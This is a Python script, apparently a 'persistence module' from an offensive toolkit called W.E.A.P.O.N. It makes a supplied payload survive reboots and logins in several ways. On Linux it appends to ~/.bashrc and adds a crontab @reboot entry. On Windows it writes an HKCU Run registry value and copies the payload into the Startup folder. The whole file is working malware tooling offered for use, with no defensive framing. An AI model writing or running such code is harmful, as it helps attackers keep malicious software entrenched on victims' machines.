import os
import sys
import argparse
import platform
import shutil
import subprocess

def linux_bashrc(payload_path):
    bashrc = os.path.expanduser("~/.bashrc")
    with open(bashrc, "a") as f:
        f.write(f"\n# WEAPON persistence\n{payload_path} &\n")
    print(f"[+] Appended payload to {bashrc}")

def linux_crontab(payload_path):
    try:
        subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot {payload_path}") | crontab -', shell=True, check=True)
        print("[+] Persistence added via crontab @reboot")
    except subprocess.CalledProcessError:
        print("[!] Failed to set crontab persistence")

def windows_registry(payload_path):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WPN_Persist", 0, winreg.REG_SZ, payload_path)
        winreg.CloseKey(key)
        print("[+] Registry persistence added at HKCU\\...\\Run\\WPN_Persist")
    except Exception as e:
        print(f"[!] Registry persistence failed: {e}")

def windows_startup(payload_path):
    startup = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    if not os.path.exists(startup):
        print("[!] Startup folder not found.")
        return

    dst = os.path.join(startup, os.path.basename(payload_path))
    try:
        shutil.copy(payload_path, dst)
        print(f"[+] Payload copied to Startup folder: {dst}")
    except Exception as e:
        print(f"[!] Failed to copy to Startup: {e}")

def main():
    parser = argparse.ArgumentParser(description="Persistence Module - W.E.A.P.O.N.")
    parser.add_argument("payload", help="Path to the payload script/binary")
    parser.add_argument("--mode", choices=["bashrc", "crontab", "registry", "startup", "all"],
                        default="all", help="Persistence method to apply")

    args = parser.parse_args()
    payload = os.path.abspath(args.payload)

    if not os.path.exists(payload):
        print(f"[!] Payload not found: {payload}")
        sys.exit(1)

    current_os = platform.system().lower()

    print(f"[*] Detected OS: {current_os}")
    print(f"[*] Applying persistence using mode: {args.mode}")

    if current_os == "linux":
        if args.mode in ("bashrc", "all"):
            linux_bashrc(payload)
        if args.mode in ("crontab", "all"):
            linux_crontab(payload)

    elif current_os == "windows":
        if args.mode in ("registry", "all"):
            windows_registry(payload)
        if args.mode in ("startup", "all"):
            windows_startup(payload)
    else:
        print("[!] Unsupported OS")

if __name__ == "__main__":
    main()

